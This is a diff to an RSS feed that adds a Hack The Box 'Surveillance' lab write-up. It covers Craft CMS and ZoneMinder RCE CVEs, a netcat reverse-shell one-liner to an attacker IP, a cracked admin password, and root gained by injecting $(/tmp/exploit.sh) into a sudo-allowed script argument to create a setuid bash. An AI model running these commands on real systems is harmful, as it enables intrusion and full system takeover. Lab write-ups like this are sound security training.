@@ -6,8 +6,153 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Wed, 17 Apr 2024 22:14:41 -0500</lastBuildDate>
+        <lastBuildDate>Fri, 19 Apr 2024 15:48:38 -0500</lastBuildDate>
         <atom:link href="https://scorpiosec.com/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>HTB: Surveillance</title>
+            <link>https://scorpiosec.com/posts/2024/04/htb-surveillance/</link>
+            <pubDate>Fri, 19 Apr 2024 15:48:38 -0500</pubDate>
+            
+            <guid>https://scorpiosec.com/posts/2024/04/htb-surveillance/</guid>
+            <description>Platform: Hack The Box Link: Surveillance Level: Medium OS: Linux Surveillance begins with the discovery of a web application running on port 80, after identifying the software version, we use CVE-2023-41892 to gain initial access. Through further exploration, we find a database backup leaking the user name and password hash for an admin user, which we utilize to SSH into the system and uncover an internal service. Leveraging SSH tunneling, we access the service and make use of CVE-2023-26035 to exploit it.</description>
+            <content type="html"><![CDATA[<ul>
+<li>Platform: Hack The Box</li>
+<li>Link: <a href="https://app.hackthebox.com/machines/Surveillance" target="_blank" >Surveillance</a>
+
+</li>
+<li>Level: Medium</li>
+<li>OS: Linux</li>
+</ul>
+<hr>
+<p>Surveillance begins with the discovery of a web application running on port 80, after identifying the software version, we use CVE-2023-41892 to gain initial access. Through further exploration, we find a database backup leaking the user name and password hash for an admin user, which we utilize to SSH into the system and uncover an internal service. Leveraging SSH tunneling, we access the service and make use of CVE-2023-26035 to exploit it. Eventually, by exploiting vulnerabilities in certain scripts, we escalate our privileges and gain access to the root account.</p>
+<p>Target IP - <code>10.10.11.245</code></p>
+<h2 id="scanning">Scanning</h2>
+<pre tabindex="0"><code>nmap -sC -sV -oA nmap/Surveillance 10.10.11.245
+</code></pre><p><strong>Results</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-04-14 12:04 CDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.245
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.044s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://surveillance.htb/
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 9.52 seconds
+</span></span></code></pre></div><p>We have two open ports 22 (SSH) and 80 (HTTP - nginx), we are also redirected to <code>http://surveillance.htb/</code>.</p>
+<pre tabindex="0"><code>sudo echo &#34;10.10.11.245 surveillance.htb&#34; | sudo tee -a /etc/hosts
+</code></pre><h2 id="enumeration">Enumeration</h2>
+<p>The website is for a company offering security services but it does not offer any exploitable features.</p>
+<p><img src="/images/HTB-Surveillance/surveillance-website.png" alt="Surveillance website"></p>
+<p>With <code>Wappalyzer</code> we discovered that the website is using <code>Craft CMS</code>. Going through the source code we find that the version running is <code>4.4.14</code>.</p>
+<p><img src="/images/HTB-Surveillance/Wappalyzer.png" alt="Wappalyzer results"></p>
+<p><img src="/images/HTB-Surveillance/Craft-CMS-version.png" alt="Craft CMS version"></p>
+<p>Searching for vulnerabilities leads to <a href="https://www.exploit-db.com/exploits/51918" target="_blank" >CVE-2023-41892</a>
+
+ allowing for unauthenticated remote code execution. A PoC is available <a href="https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce" target="_blank" >here</a>
+
+.</p>
+<blockquote>
+<p>In my experience the PoC above does not properly work sometimes, if this happens to you use <a href="https://github.com/Faelian/CraftCMS_CVE-2023-41892" target="_blank" >this one</a>
+
+ instead.</p>
+</blockquote>
+<h2 id="initial-foothold">Initial Foothold</h2>
+<p>After running the script we get a shell.</p>
+<p><img src="/images/HTB-Surveillance/foothold.png" alt="Surveillance initial foothold"></p>
+<p>We seem to be unable to upgrade it so let&rsquo;s redirect it to a netcat listener.</p>
+<pre tabindex="0"><code>nc -lvnp 4444
+</code></pre><p>Run the command below on the target (copy it all and paste it in your terminal)</p>
+<pre tabindex="0"><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.15.4 4444 &gt;/tmp/f 
+/usr/bin/script -qc /bin/bash /dev/null
+</code></pre><p><img src="/images/HTB-Surveillance/revshell.png" alt="Reverse shell transfer"></p>
+<p>We then upgrade the shell we obtain via our listener.</p>
+<pre tabindex="0"><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
+export TERM=xterm
+Ctrl + Z
+stty raw -echo; fg
+stty rows 38 columns 116
+</code></pre><p><img src="/images/HTB-Surveillance/new-shell.png" alt="New shell"></p>
+<p>For the system enumeration, we run <code>linpeas</code>. We note that <code>mysql</code> is running on the target.</p>
+<p><img src="/images/HTB-Surveillance/mysql.png" alt="MySQL service"></p>
+<p><img src="/images/HTB-Surveillance/mysql1.png" alt="MySQL version"></p>
+<p>We also find credentials for the MySQL instance.</p>
+<p><img src="/images/HTB-Surveillance/Craft-db-pwd.png" alt="MySQL credentials"></p>
+<blockquote>
+<p>We end up finding a <code>craftdb</code> database, with a table named <code>users</code> but we cannot crack the hashes found there.</p>
+</blockquote>
+<p>A backup of the database is also found on the target in <code>/var/www/html/craft/storage/backups/</code>.</p>
+<p><img src="/images/HTB-Surveillance/files.png" alt="FIles found by linpeas"></p>
+<p>The archive is sent to our local machine, after unzipping it and checking its content we find a hash for the user <code>Matthew</code> which is an admin.</p>
+<blockquote>
+<p>If you run <code>cat /etc/passwd</code> on the target you will indeed see the user <code>matthew</code>.</p>
+</blockquote>
+<p><img src="/images/HTB-Surveillance/matthew.png" alt="matthew user"></p>
+<p>Using <a href="https://crackstation.net/" target="_blank" >CrackStation</a>
+
+ we confirm that it is a sha256 hash and successfully crack it to recover the password <code>starcraft122490</code>.</p>
+<p><img src="/images/HTB-Surveillance/matthew-pwd.png" alt="matthew user password"></p>
+<p>With the credentials <code>matthew:starcraft122490</code> we log in via SSH and get the user flag.</p>
+<p><img src="/images/HTB-Surveillance/user-flag.png" alt="user flag"></p>
+<h3 id="port-forwarding">Port Forwarding</h3>
+<p>Checking the services running on the target with <code>ss -lntp</code> we find something on port <code>8080</code>.</p>
+<p><img src="/images/HTB-Surveillance/ss-cmd.png" alt="ss command"></p>
+<p>We use port forwarding to access the service. On our local machine we run</p>
+<pre tabindex="0"><code>ssh -f -N -L 5555:127.0.0.1:8080 matthew@surveillance.htb
+</code></pre><blockquote>
+<p>The command above establishes a tunnel from the local machine to the remote server <code>surveillance.htb</code>.</p>
+</blockquote>
+<p>We then access the service by visiting <code>localhost:5555</code>, and find a <code>ZoneMinder</code> instance.</p>
+<blockquote>
+<p>&ldquo;ZoneMinder is a free, open source Closed-circuit television software application developed for Linux which supports IP, USB and Analog cameras.&rdquo; Source - <a href="https://github.com/ZoneMinder/zoneminder" target="_blank" >ZoneMinder Github</a>
+
+</p>
+</blockquote>
+<p><img src="/images/HTB-Surveillance/ZoneMinder.png" alt="ZoneMinder instance"></p>
+<p>Searching <code>zoneminder exploit</code> we find a <a href="https://github.com/rvizx/CVE-2023-26035" target="_blank" >PoC</a>
+
+ for <a href="https://www.exploit-db.com/exploits/51902" target="_blank" >CVE-2023-26035</a>
+
+ which also leads to unauthenticated RCE.</p>
+<pre tabindex="0"><code>git clone https://github.com/rvizx/CVE-2023-26035
+cd CVE-2023-26035
+python3 exploit.py -t &lt;target_url&gt; -ip &lt;attacker-ip&gt; -p &lt;port&gt;
+</code></pre><p><img src="/images/HTB-Surveillance/ZM-exploit.png" alt="ZoneMinder RCE exploit"></p>
+<p>On our listener we get another shell as <code>zoneminder</code>.</p>
+<p><img src="/images/HTB-Surveillance/ZM-shell.png" alt="ZoneMinder RCE shell"></p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Running <code>sudo -l</code>, we learn that the user <code>zoneminder</code> can execute anything matching the pattern <code>/usr/bin/zm[a-zA-Z]*.pl</code> with <code>sudo</code> privileges without being prompted for a password. Moreover any options can be passed to the commands thanks to the wildcard <code>*</code>.</p>
+<p><img src="/images/HTB-Surveillance/sudo-l.png" alt="sudo -l command"></p>
+<p>Checking the content of <code>zmupdate.pl</code> we see that we can pass some arguments to it with switches like <code>--version</code> and <code>--user</code>.</p>
+<p><img src="/images/HTB-Surveillance/zmupdate.png" alt="zmupdate script"></p>
+<p>So we can potentially make it execute a file for us.</p>
+<pre tabindex="0"><code>echo &#39;cp /bin/bash /tmp/bash;chmod 4755 /tmp/bash&#39; &gt; /tmp/exploit.sh
+chmod +x /tmp/exploit.sh
+</code></pre><blockquote>
+<p>When the <code>exploit.sh</code> script will be executed, it will create a copy of the <code>bash</code> binary in <code>/tmp</code> and set its permissions to be executable with elevated privileges (setuid).</p>
+</blockquote>
+<p>With command substitution we execute our script via the <code>zmupdate.pl</code> script.</p>
+<pre tabindex="0"><code>sudo /usr/bin/zmupdate.pl --version=1 --user=&#39;$(/tmp/exploit.sh)&#39;
+</code></pre><blockquote>
+<p>When the command is executed, anything enclosed within <code>$(...)</code> is treated as a command to be executed by the shell, and the output of that command replaces the command substitution. In this case, <code>/tmp/exploit.sh</code> is a script that creates a setuid binary for <code>/bin/bash</code> in the <code>/tmp</code> directory.</p>
+</blockquote>
+<p>After starting a new instance of the bash shell we get to root.</p>
+<pre tabindex="0"><code>/tmp/bash -p
+</code></pre><p><img src="/images/HTB-Surveillance/root-flag.png" alt="root flag"></p>
+<p>This challenge was pretty straightforward and displayed how tunneling can be used for exploitation. If you want to dive deeper into tunneling Hack The Box has an excellent module on it available <a href="https://academy.hackthebox.com/module/details/158" target="_blank" >here</a>
+
+. If you want to experiment with different tunneling tools you can check out <a href="https://github.com/anderspitman/awesome-tunneling" target="_blank" >awesome-tunneling</a>
+
+.</p>
+]]></content>
+        </item>
         
         <item>
             <title>THM: Creative</title>
